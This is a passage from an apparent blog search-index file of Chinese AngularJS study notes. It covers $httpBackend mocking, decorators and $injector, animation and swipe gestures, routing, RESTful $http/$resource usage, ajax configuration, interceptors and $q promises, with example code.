expect(mockScope.products[2].name).toEqual(\"Pears\"); &#125;);&#125;); $httpBackend仿造服务提供能匹配$http服务所需的API，定义了如下的方法： expect(method, url, data, headers) 定义期望的请求，它匹配方法和URL(包含可选数据和头部的匹配) flush() / flush(count) 发回等待结果（可选参数指定响应数量） resetExpectations() 重置所有期望 verifyNoOutstandingExpectation() 检测所有已接收到的期望的请求 respond(data) / respond（status, data, headers） 为请求定义响应","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"},{"name":"jasmine","slug":"jasmine","permalink":"https://github.com/xmoyKING/tags/jasmine/"}]},{"title":"angularjs入门笔记-25-$provider和$injector服务","slug":"angularjs25","date":"2017-07-13T03:00:56.000Z","updated":"2017-12-06T14:50:08.899Z","comments":true,"path":"2017/07/13/angularjs25/","link":"","permalink":"https://github.com/xmoyKING/2017/07/13/angularjs25/","excerpt":"","text":"当自定义一个组件时ng在背后注入这组件并提供它所依赖的服务，理解这种背后的机制对使用ng很有帮助，并在单元测试中也非常有用。 使用$provider.decorator方法对服务进行修饰 使用$injecotr服务获取函数声明的依赖 使用$rootElement.injector方法不声明依赖，获取$injector服务 注册ng组件$injecotr服务用于注册组件，如服务本身就是一个组件，这些组件可被注入，满足其他组件的依赖（实际上是由$injecotr服务做“注入”工作），一般情况下，$provider服务所定义的方法通过Module暴露出来以提供访问，但有一些特殊的方法不适合通过Module使用。 由$provider服务定义的方法： constant(name, value) 定义常量 decorator(name, service) 定义修饰器 factory(name, service) 定义服务 provider(name, service) 定义服务 service(name, service) 定义服务 value(name, value) 定义变量服务通过Module无法访问的方法是decorator, 此方法能“装饰”服务，即在不修改服务本身的情况下，对服务执行前后做一些修改，有点类似拦截器的行为方式。如下示例，使用decorator改变$log服务的行为：123456789101112131415161718192021222324252627282930&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Components&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .config(function($provider) &#123; $provider.decorator(\"$log\", function ($delegate) &#123; $delegate.originalLog = $delegate.log; $delegate.log = function (message) &#123; $delegate.originalLog(\"Decorated: \" + message); &#125; return $delegate; &#125;); &#125;) .controller(\"defaultCtrl\", function ($scope, $log) &#123; $scope.handleClick = function () &#123; $log.log(\"Button Clicked\"); &#125;; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"well\"&gt; &lt;button class=\"btn btn-primary\" ng-click=\"handleClick()\"&gt;Click Me!&lt;/button&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 注意： 在配置函数中声明对$provider服务的依赖 $provider.decorator方法的第一个参数是字符串，因为不是声明依赖，所以需要用字符串 $delegate表示代理对象，被装饰的服务，本例即$log服务 在函数中对代理对象$delegate服务进行修改后需要返回代理对象$delegate，否则函数会默认返回undefined 管理注入$injector服务负责确定函数声明的依赖，并提供这些依赖组件。以下是$injector服务定义的方法 annotate(fn) 获取指定函数的参数，包括那些未声明的服务（未声明则不会响应） get(name) 获取指定服务名称的服务对象 has(name) 如果指定名称的服务存在，则返回true invoke(fn, self, locals) 调用指定函数，使用指定的值作为该函数的this并使用指定的非服务参数值$injector服务是ng的底层核心，一般很少使用到。 一般情况下，js作为弱类型语言，函数参数是不定的，数量和类型都可以变动，所以函数定义时需要指定参数名，同时js缺乏为函数做注解的能力，在ng中，为了解决这种问题，ng使用Annotate方法，用于获取函数已声明的依赖集。1234567891011121314151617181920212223242526272829303132333435&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Components&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope, $injector) &#123; var counter = 0; var logClick = function ($log, $exceptionHandler, message) &#123; if (counter == 0) &#123; $log.log(message); counter++; &#125; else &#123; $exceptionHandler(\"Already clicked\"); &#125; &#125; $scope.handleClick = function () &#123; var deps = $injector.annotate(logClick); for (var i = 0; i &lt; deps.length; i++) &#123; console.log(\"Dependency: \" + deps[i]); &#125; &#125;; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"well\"&gt; &lt;button class=\"btn btn-primary\" ng-click=\"handleClick()\"&gt;Click Me!&lt;/button&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上例中，函数logClick依赖$log和$exceptionHandler服务，以及一个普通的js函数参数message上图显示了，deps数组内的元素为logClick函数声明的依赖和参数，有的时候只需要服务依赖，而不需要普通的参数，则此时可以使用has判断12345for (var i = 0; i &lt; deps.length; i++) &#123; if ($injector.has(deps[i])) &#123; console.log(\"Dependency: \" + deps[i]); &#125;&#125; 此时则只会在控制台输出服务依赖，而没有message参数了 通过get方法可以获取服务对象：1234567891011121314151617181920212223242526272829303132333435363738394041&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Components&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope, $injector) &#123; var counter = 0; var logClick = function ($log, $exceptionHandler, message) &#123; if (counter == 0) &#123; $log.log(message); counter++; &#125; else &#123; $exceptionHandler(\"Already clicked\"); &#125; &#125; $scope.handleClick = function () &#123; var deps = $injector.annotate(logClick); var args = []; for (var i = 0; i &lt; deps.length; i++) &#123; if ($injector.has(deps[i])) &#123; args.push($injector.get(deps[i])); &#125; else if (deps[i] == \"message\") &#123; args.push(\"Button Clicked\"); &#125; &#125; logClick.apply(null, args); &#125;; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"well\"&gt; &lt;button class=\"btn btn-primary\" ng-click=\"handleClick()\"&gt;Click Me!&lt;/button&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 连续点击两次则控制台会输出如下截图的内容可以发现，其实是显式调用了logClick方法，每次调用的时候都将改变后的args数组传入函数 invoke方法可以找到服务并管理这些服务：123456789101112131415161718192021222324252627282930313233&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Components&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope, $injector) &#123; var counter = 0; var logClick = function ($log, $exceptionHandler, message) &#123; if (counter == 0) &#123; $log.log(message); counter++; &#125; else &#123; $exceptionHandler(\"Already clicked\"); &#125; &#125; $scope.handleClick = function () &#123; var localVars = &#123; message: \"Button Clicked\" &#125;; $injector.invoke(logClick, null, localVars); &#125;; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"well\"&gt; &lt;button class=\"btn btn-primary\" ng-click=\"handleClick()\"&gt;Click Me!&lt;/button&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 传入invoke方法的参数依次是将被调用的函数，this值，以及与函数参数一致的属性的对象，这个对象不是服务依赖。 $rootElement服务提供访问应用了ng-app指令的html元素的方法，它是ng应用的根，$rootElement服务作为jqLite对象表示，即可以通过jqLite的方式定位或修改DOM。$rootElement服务对象由一个injector方法，它返回$injector服务对象。123456789101112131415161718192021222324252627282930313233&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Components&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .controller(\"defaultCtrl\", function ($scope, $rootElement) &#123; var counter = 0; var logClick = function ($log, $exceptionHandler, message) &#123; if (counter == 0) &#123; $log.log(message); counter++; &#125; else &#123; $exceptionHandler(\"Already clicked\"); &#125; &#125; $scope.handleClick = function () &#123; var localVars = &#123; message: \"Button Clicked\" &#125;; $rootElement.injector().invoke(logClick, null, localVars); &#125;; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"well\"&gt; &lt;button class=\"btn btn-primary\" ng-click=\"handleClick()\"&gt;Click Me!&lt;/button&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 一般来说是不需要通过$rootElement获取$injector服务的，因为可以直接声明对$injector的依赖。","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs入门笔记-24-动画&触控（swipe)手势","slug":"angularjs24","date":"2017-07-09T02:23:28.000Z","updated":"2017-12-06T14:50:08.899Z","comments":true,"path":"2017/07/09/angularjs24/","link":"","permalink":"https://github.com/xmoyKING/2017/07/09/angularjs24/","excerpt":"","text":"ng为在DOM中的动态内容变化的动画效果和处理触控事件提供了两种服务，一个是动态内容转变时使用指定的命名结构定义包含动画（animations）或转变（transitions）的CSS样式，并在指令上应用这些类，还有一个就是使用ng-swipe-left和ng-swipe-right监控触控手势。 动画当在DOM中添加、移除、移动元素时，$animate服务能对这些操作加上动画，但$animate服务自身不定义动画，而是依靠css3的animation和transition，即不是js动画。css3的动画和转变与js完全是两种不同的机制。注：动画应该是精妙、简短、快速的，目标是将用户的注意力集中在已被改变的事物上，所以需要一致、谨慎、甚至是保守的使用动画。 $animate服务是可选的，定义在模块ngAnimate中，用时需要导入ngAnimate模块文件，并定义module时需要声明对ngAnimate模块的依赖。 $animate服务并不是直接用于动画上的，相反，用css定义动画或转变，按照专门规范的命名，在元素应用这些class名。ng动画的关键时，理解当指令改变内容时，与之相对应的class发生了那些变化，同时添加了那些class，如下列出支持动画的内置指令和与之对于相关的名称 ng-repeat enter、leave、move ng-view enter、leave ng-include enter、leave ng-switch enter、leave ng-if enter、leave ng-class add、remove ng-show add、remove ng-hide add、removeenter用于展示内容时，leave用于隐藏内容时，move用于内容在DOM中被移动时，add和remove用于从DOM中添加或移除时。 1234567891011&lt;style type=\"text/css\"&gt; .ngFade.ng-enter &#123; transition: 0.1s linear all; opacity: 0; &#125; .ngFade.ng-enter-active &#123; opacity: 1; &#125;&lt;/style&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"panel panel-primary\"&gt; &lt;h3 class=\"panel-heading\"&gt;Products&lt;/h3&gt; &lt;div ng-view class=\"ngFade\"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt; .ngFade.ng-enter中的ngFade是自定义的，命名只要符合css命名语法就可以，ng-enter就不是可以自定义名称的了，其中ng-的前缀必不可少，对与上例来说，ng-enter是当ng-view指令中的内容添加时ngAnimate在div上自动添加的class名，而ng-enter-active时内容添加结束时在div上添加的class名效果即为：视图加载前是透明的，然后在0.1s内完成动画，在结束时变为不透明。（即淡入效果） 一般来说，需要为旧内容的移除和新内容的添加同时设置动画，即：1234.ngFade.ng-enter &#123; transition: 0.1s linear all; opacity: 0; &#125;.ngFade.ng-enter-active &#123; opacity: 1; &#125;.ngFade.ng-leave &#123; transition: 0.1s linear all; opacity: 1; &#125;.ngFade.ng-leave-active &#123; opacity: 0; &#125; 触控ngTouch模块包含$swipe服务，在ngTouch模块中的事件提供触控手势并取代ng-click指令。ngTouch单击触控事件可被用于检测从左到右或从右到左的触控手势。123456789101112131415161718192021222324252627282930&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Swipe Events&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;script src=\"angular-touch.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", [\"ngTouch\"]) .controller(\"defaultCtrl\", function ($scope, $element) &#123; $scope.swipeType = \"&lt;None&gt;\"; $scope.handleSwipe = function(direction) &#123; $scope.swipeType = direction; &#125; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"panel panel-default\"&gt; &lt;div class=\"panel-body\"&gt; &lt;div class=\"well\" ng-swipe-right=\"handleSwipe('left-to-right')\" ng-swipe-left=\"handleSwipe('right-to-left')\"&gt; &lt;h4&gt;Swipe Here&lt;/h4&gt; &lt;/div&gt; &lt;div&gt;Swipe was: &#123;&#123;swipeType&#125;&#125;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 上例先声明ngTouch模块的依赖，该事件处理器适用于ng-swipe-left和ng-swipe-right两个指令，在div元素上应用这些指令，并使用行内绑定表达式设置他们调用控制器行为，更新绑定的swipeType数据。","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs入门笔记-23-视图服务","slug":"angularjs23","date":"2017-07-05T02:28:37.000Z","updated":"2017-12-06T14:50:08.899Z","comments":true,"path":"2017/07/05/angularjs23/","link":"","permalink":"https://github.com/xmoyKING/2017/07/05/angularjs23/","excerpt":"","text":"ng的视图服务通过多个组件独立控制内容，能降低应用复杂度，比如： 使用$routeProvider定义url路由，使路由导航由前端控制 使用ng-view指令显示视图 使用$location.path方法或使用href属性改变路由 配置controller属性将视图和控制器关联 配置resolve属性定义控制器的依赖 使用事件绑定的方式，若当前路由变化时调用，参数的值以名称索引集合的形式表现的，路由参数的值通过$routeParams服务获取。 $routeChangeStart 路由改变前触发 $routeChangeSuccess 路由改变后触发 $routeChangeError 路由不能改变时触发 $routeUpdate 路由刷新时触发，其实时绑定了reloadOnSearch属性上 1234567891011$scope.$on(\"$routeChangeSuccess\", function () &#123; if ($location.path().indexOf(\"/edit/\") == 0) &#123; var id = $routeParams[\"id\"]; for (var i = 0; i &lt; $scope.products.length; i++) &#123; if ($scope.products[i].id == id) &#123; $scope.currentProduct = $scope.products[i]; break; &#125; &#125; &#125;&#125;); 路由配置项： controller 指定与路由显示的视图关联的控制器名称 controllerAs 指定控制器的别名 template 指定视图的内容，可以使html字符串或返回html字符串的函数 templateUrl 指定路由所匹配实现的视图文件的URL, 可以使字符串或返回字符串的函数 resolve 指定一组控制器的依赖 redirectTo 指定当路由匹配时浏览器应重定向的目标路径 reloadOnSearch 默认为true，仅当$location的search和hash方法改变返回值时，路由重载 caseInsensitiveMatch 默认为true，路由匹配大小写不敏感，即/Edit和/edit相同 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788angular.module(\"exampleApp\", [\"increment\", \"ngResource\", \"ngRoute\"]).constant(\"baseUrl\", \"http://localhost:5500/products/\").factory(\"productsResource\", function ($resource, baseUrl) &#123; return $resource(baseUrl + \":id\", &#123; id: \"@id\" &#125;, &#123; create: &#123; method: \"POST\" &#125;, save: &#123; method: \"PUT\" &#125; &#125;);&#125;).config(function ($routeProvider, $locationProvider) &#123; $locationProvider.html5Mode(true); $routeProvider.when(\"/edit/:id\", &#123; templateUrl: \"/editorView.html\", controller: \"editCtrl\" &#125;); $routeProvider.when(\"/create\", &#123; templateUrl: \"/editorView.html\", controller: \"editCtrl\" &#125;); $routeProvider.otherwise(&#123; templateUrl: \"/tableView.html\", controller: \"tableCtrl\", resolve: &#123; data: function (productsResource) &#123; return productsResource.query(); &#125; &#125; &#125;);&#125;).controller(\"defaultCtrl\", function ($scope, $location, productsResource) &#123; $scope.data = &#123;&#125;; $scope.createProduct = function (product) &#123; new productsResource(product).$create().then(function (newProduct) &#123; $scope.data.products.push(newProduct); $location.path(\"/list\"); &#125;); &#125; $scope.deleteProduct = function (product) &#123; product.$delete().then(function () &#123; $scope.data.products.splice($scope.data.products.indexOf(product), 1); &#125;); $location.path(\"/list\"); &#125;&#125;).controller(\"tableCtrl\", function ($scope, $location, $route, data) &#123; $scope.data.products = data; $scope.refreshProducts = function () &#123; $route.reload(); &#125;&#125;).controller(\"editCtrl\", function ($scope, $routeParams, $location) &#123; $scope.currentProduct = null; if ($location.path().indexOf(\"/edit/\") == 0) &#123; var id = $routeParams[\"id\"]; for (var i = 0; i &lt; $scope.data.products.length; i++) &#123; if ($scope.data.products[i].id == id) &#123; $scope.currentProduct = $scope.data.products[i]; break; &#125; &#125; &#125; $scope.cancelEdit = function () &#123; $location.path(\"/list\"); &#125; $scope.updateProduct = function (product) &#123; product.$save(); $location.path(\"/list\"); &#125; $scope.saveEdit = function (product) &#123; if (angular.isDefined(product.id)) &#123; $scope.updateProduct(product); &#125; else &#123; $scope.createProduct(product); &#125; $scope.currentProduct = &#123;&#125;; &#125;&#125;); 新的editCtrl控制器的实现将在每次editorView.html视图显示时创建，这意味着不需要使用$route服务事件掌控视图何时变化，只关注控制器函数是否被执行。以这种方式使用控制器的好处之一是的应用了标准的继承规则，如将editCtrl嵌套如defaultCtrl并能访问它的作用域中的数据和行为，即能在顶级控制器中定义普通数组和功能并在嵌套的控制器中定义特定视图。 resolve属性能指定将被注入controller属性指定的控制器的依赖，所依赖的可以是服务，resolve属性更多用于初始化视图所必须执行的工作，如将promises作为依赖返回，但路由不实现控制器，直到被resolved时才实现。 123456controller: \"tableCtrl\",resolve: &#123; data: function (productsResource) &#123; return productsResource.query(); &#125;&#125; 使用resolve属性创建了依赖data，data属性为在tableCtrl控制器被创建前执行的函数，结果会作为参数data传入。","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs入门笔记-22-RESTful","slug":"angularjs22","date":"2017-07-02T14:58:23.000Z","updated":"2017-12-06T14:50:08.883Z","comments":true,"path":"2017/07/02/angularjs22/","link":"","permalink":"https://github.com/xmoyKING/2017/07/02/angularjs22/","excerpt":"","text":"REST是一种基于HTTP请求的操作的API风格，而不是规范，是否使用REST取决于需求。 当使用$http服务，通过显式的用ajax请求使用RESTful API 当使用$resource服务，通过不显示的用ajax请求使用RESTful API 当自定义动作或重定义默认时，使用$resource服务前剪裁ajax请求 使用RESTful风格的API需要后端支持，本次使用Deployd作为简易后端。关于Deployd，查看如何安装以及简单使用请至官网：deployd 使用$http服务RESTful服务用于标准异步HTTP请求，而$http服务提供了获取数据至应用作用域的特性。1234567891011121314151617181920212223242526272829303132333435363738394041424344angular.module(\"exampleApp\", []).constant(\"baseUrl\", \"http://localhost:5500/products/\") // 设置基本请求接口.controller(\"defaultCtrl\", function ($scope, $http, baseUrl) &#123; $scope.displayMode = \"list\"; $scope.currentProduct = null; $scope.listProducts = function () &#123; // 获取 $http.get(baseUrl).success(function (data) &#123; $scope.products = data; &#125;); &#125; $scope.deleteProduct = function (product) &#123; // 根据id删除 $http(&#123; method: \"DELETE\", url: baseUrl + product.id &#125;).success(function () &#123; $scope.products.splice($scope.products.indexOf(product), 1); &#125;); &#125; $scope.createProduct = function (product) &#123; // 创建 $http.post(baseUrl, product).success(function(newProduct)&#123; $scope.products.push(newProduct); $scope.displayMode = \"list\"; &#125;); &#125; $scope.updateProduct = function (product) &#123; // 修改 $http(&#123; url: baseUrl + product.id, method: \"PUT\", data: product &#125;).success(function (modifiedProduct) &#123; for (var i = 0; i &lt; $scope.products.length; i++) &#123; if ($scope.products[i].id == modifiedProduct.id) &#123; $scope.products[i] = modifiedProduct; break; &#125; &#125; $scope.displayMode = \"list\"; &#125;); &#125; 使用$resouce服务ng通过$resource服务把ajax请求和url格式的细节隐藏，使得更容易与RESTful数据交互。$resouce服务不是内置的，而是可选的模块，用时需要下载ngResouce模块。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455angular.module(\"exampleApp\", [\"increment\", \"ngResource\"]).constant(\"baseUrl\", \"http://localhost:5500/products/\").controller(\"defaultCtrl\", function ($scope, $http, $resource, baseUrl) &#123; $scope.displayMode = \"list\"; $scope.currentProduct = null; // 配置$resouce服务，第一个参数指定url的格式，其中冒号后面的表示变量，第二个参数指定第一个参数中的变量部分，通过@前缀绑定数据对象的某个属性 $scope.productsResource = $resource(baseUrl + \":id\", &#123; id: \"@id\" &#125;); $scope.listProducts = function () &#123; // 获取数据 $scope.products = $scope.productsResource.query(); &#125; $scope.deleteProduct = function (product) &#123; product.$delete().then(function () &#123; $scope.products.splice($scope.products.indexOf(product), 1); &#125;); $scope.displayMode = \"list\"; &#125; $scope.createProduct = function (product) &#123; new $scope.productsResource(product).$save().then(function(newProduct) &#123; $scope.products.push(newProduct); $scope.displayMode = \"list\"; &#125;); &#125; $scope.updateProduct = function (product) &#123; product.$save(); // 修改 $scope.displayMode = \"list\"; &#125; $scope.editOrCreateProduct = function (product) &#123; $scope.currentProduct = product ? product : &#123;&#125;; $scope.displayMode = \"edit\"; &#125; $scope.saveEdit = function (product) &#123; if (angular.isDefined(product.id)) &#123; $scope.updateProduct(product); &#125; else &#123; $scope.createProduct(product); &#125; &#125; $scope.cancelEdit = function () &#123; if ($scope.currentProduct &amp;&amp; $scope.currentProduct.$get) &#123; $scope.currentProduct.$get(); &#125; $scope.currentProduct = &#123;&#125;; $scope.displayMode = \"list\"; &#125; $scope.listProducts();&#125;);","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"},{"name":"deployd","slug":"deployd","permalink":"https://github.com/xmoyKING/tags/deployd/"},{"name":"rest","slug":"rest","permalink":"https://github.com/xmoyKING/tags/rest/"}]},{"title":"angularjs入门笔记-21-ajax和promises","slug":"angularjs21","date":"2017-06-28T02:24:24.000Z","updated":"2017-12-06T14:50:08.883Z","comments":true,"path":"2017/06/28/angularjs21/","link":"","permalink":"https://github.com/xmoyKING/2017/06/28/angularjs21/","excerpt":"","text":"ajax是现代web应用的基础，当需要让浏览器加载新内容而不刷新页面时就需要用到ajax，ng内置了ajax请求和异步promises。 发起ajax请求 使用$http服务 接收ajax请求响应 使用success，error或then方法在$http方法返回的对象上注册回调函数 处理非json数据，若是xml可使用jqLite处理 请求或预处理响应配置 使用转换函数 默认ajax配置 使用$httpProvider 拦截请求或响应 使用$httpProvider注册拦截器工厂函数 表示在未来某刻的活动 使用promises，由deferred对象和promises对象组成 获取deferred对象 调用由$q服务提供的defer方法 获取promises对象 使用由deferred对象定义的promise值 链接所有promises 使用then方法注册回调，then返回另一个promises，当回调函数被执行时该promises将被resolved 等待多个promises 使用$q.all方法创建promises，所有promises被resolved后整体才会resolved ajax一般通过ng内置的$http服务发起ajax请求，它是被异步执行的标准http请求（这也是$http服务名称的来源吧）。ajax异步刷新能向后台请求内容和数据，创建富客户端的重要手段。 使用jquery中的ajax与ng中的ajax差别就是，ng中将从服务器获取的数据应用到作用域中会自动更新所有绑定，而jquery中需要显示处理数据，并且操纵dom。 $http服务产生请求有两种方法，一种是使用如下的一些快捷方法： get(url, config) 执行GET请求 post(url, data, config) 执行POST请求 delete(url, config) 执行DELETE请求 put(url, data, config) 执行PUT请求 head(url, config) 执行HEAD请求 jsonp(url, config) 执行跨域js请求,JSONP（JSON with Padding表示JSON和填充）能绕过浏览器对js代码被载入的限制的工作方式。另一个是将$http服务对象当做函数传入配置对象。12345678angular.module(\"exampleApp\", []).controller(\"defaultCtrl\", function ($scope, $http) &#123; $scope.loadData = function () &#123; $http.get(\"productData.json\").success(function (data) &#123; $scope.products = data; &#125;); &#125;&#125;); GET和POST，应该如何选择一般的经验是GET请求仅被用于所有只读的信息检索，而POST请求被用于改变应用状态的操作，所以GET是安全的，除了检索它没有任何副作用，而POST是不安全的（有可能会改变一些东西）。同时GET请求是可寻址的，即所有信息都被包含在URL中，所以它适合放入书签，链接这些地址。GET请求不应该用于改变状态。若该GET请求是一个删除操作，因为url很有可能会被爬虫访问，而此时则会造成很大的破坏。 接收响应发起ajax请求只是第一部分，当它响应时，我们需要接收响应，对返回的数据进行处理，由$http服务方法返回的承诺对象所定义的方法： success(fn) 当http请求完成时，调用fn error(fn) 当http请求无法完成时，调用fn then(fn1, fn2) 注册成功函数fn1和失败函数fn2success和error方法接收简化后的响应，success接收服务器正常返回数据，error接收问题的描述字符串。then方法提供了更详细的响应信息，如下是then传入处理函数的对象的属性 data 请求返回数据 status 返回http状态码 headers 返回指定的http头部信息 config 配置对象，该对象是在发起ajax前配置1234567$http.get(\"productData.json\").then(function (response) &#123; console.log(\"Status: \" + response.status); console.log(\"Type: \" + response.headers(\"content-type\")); console.log(\"Length: \" + response.headers(\"content-length\")); console.log(response.config); $scope.products = response.data;&#125;); 使用then方法时，ng自动处理json数据 配置ajax请求由$http服务定义的方法都接收一个可选参数，即配置对象，绝大多数情况下使用默认配置即可，但也可显式设置。 data 设置发送到服务器的数据，若设置了该值，则会被ng序列化为JSON格式 headers 用于设置请求头部 method 设置请求所使用的HTTP方法 params 用于设置URL属性 timeout 设置请求过期时间 transformRequest 用于在请求发送到服务器前操作数据 transformResponse 用于在请求发送到服务器后操作数据 url 设置请求url withCredentials 为true时，表示底层浏览器请求对象上的withCredentials选项可用，包含在请求中验证cookie xsrfHeaderName,xsrfCookieName 这些属性用来防跨域请求伪造攻击在ng中，内置的转换就是将传出的数据序列化为JSON，传入的JSON解析成js对象。将配置对象上的transformRequest属性来转换响应，该函数负责返回更换后的数据，通常是发送给服务器的反序列化版本，比如若与服务器约定的格式是xml格式，那么将请求转换为xml，将响应转换为json。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// 获取xml响应$scope.loadData = function () &#123; var config = &#123; transformResponse: function (data, headers) &#123; if(headers(\"content-type\") == \"application/xml\" &amp;&amp; angular.isString(data)) &#123; products = []; var productElems = angular.element(data.trim()).find(\"product\"); for (var i = 0; i &lt; productElems.length; i++) &#123; var product = productElems.eq(i); products.push(&#123; name: product.attr(\"name\"), category: product.attr(\"category\"), price: product.attr(\"price\") &#125;); &#125; return products; &#125; else &#123; return data; &#125; &#125; &#125; $http.get(\"productData.xml\", config).success(function (data) &#123; $scope.products = data; &#125;);&#125;// 发送xml请求$scope.sendData = function() &#123; var config = &#123; headers: &#123; \"content-type\": \"application/xml\" &#125;, transformRequest: function (data, headers) &#123; var rootElem = angular.element(\"&lt;xml&gt;\"); for (var i = 0; i &lt; data.length; i++) &#123; var prodElem = angular.element(\"&lt;product&gt;\"); prodElem.attr(\"name\", data[i].name); prodElem.attr(\"category\", data[i].category); prodElem.attr(\"price\", data[i].price); rootElem.append(prodElem); &#125; rootElem.children().wrap(\"&lt;products&gt;\"); return rootElem.html(); &#125; &#125; $http.post(\"ajax.html\", $scope.products, config);&#125; 配置默认ajax通过$http服务提供器$httpProvider为ajax请求定义默认设置，该提供器定义了一些属性： defaults.headers.common 定义用于所有请求的默认头部 defaults.headers.post 定义用于POST请求的默认头部 defaults.headers.put 定义用于PUT请求的默认头部 defaults.transformRequest 定义用于所有请求的转换函数的数组 defaults.transformResponse 定义用于所有响应的转换函数的数组 interceptors 拦截器工厂函数数组，拦截器是转换函数的复杂形式 withCredentials 为所有请求设置withCredentials项，该属性常常用于发起需要验证的跨域请求defaults.transformRequest和defaults.transformResponse属性是数组，必须用push方法添加。 $httpProvider.interceptors属性是一个数组，插入数组中的每一个元素都有一些属性，而拦截器是转换函数的最佳复杂替代品就是由于这些属性中的request和response。 request 在产生请求并传入配置对象前调用拦截器函数 requestError 在上一个请求拦截器抛出错误时调用的拦截器函数 response 在响应并传入配置对象前调用拦截器函数 responseError 在上一个响应拦截器抛出错误时调用的拦截器函数123456789101112$httpProvider.interceptors.push(function () &#123; return &#123; request: function (config) &#123; config.url = \"productData.json\"; return config; &#125;, response: function (response) &#123; console.log(\"Data Count: \" + response.data.length); return response; &#125; &#125;&#125;); 在上述代码中，在工厂方法产生的对象定义了request和response属性，request拦截器将配置对象的url修改为productData.json,然后返回config对象将其传给下一个拦截器。response拦截器也是这样，不管前面你如何操作/修改，最后都需要返回response对象给下一个拦截器。 使用promisespromises是一个对未来发生的事情的注册方式，如ajax请求。promises需要的对象有两个，promise对象用于接收响应的通知，deferred对象用于发送通知。ng内置的$q服务来获取和管理promises，$q服务定义了一些方法： all(promises) 当指定数组中所有promises被解决或其中任一被拒绝时返回promises defer() 创建deferred对象 reject(reason) 返回被拒绝的promises when(value) 在被解决的promises中封装一个值作为结果 获取和使用deferred对象通过$q.defer方法获取deferred对象，该对象有如下一些方法和属性 resolve(result) 带有指定值的延迟活动完成的信号 reject(result) 延迟活动失败或由于特定原因将不被完成的信号 notify(result) 提供来自延迟活动的临时结果 promise 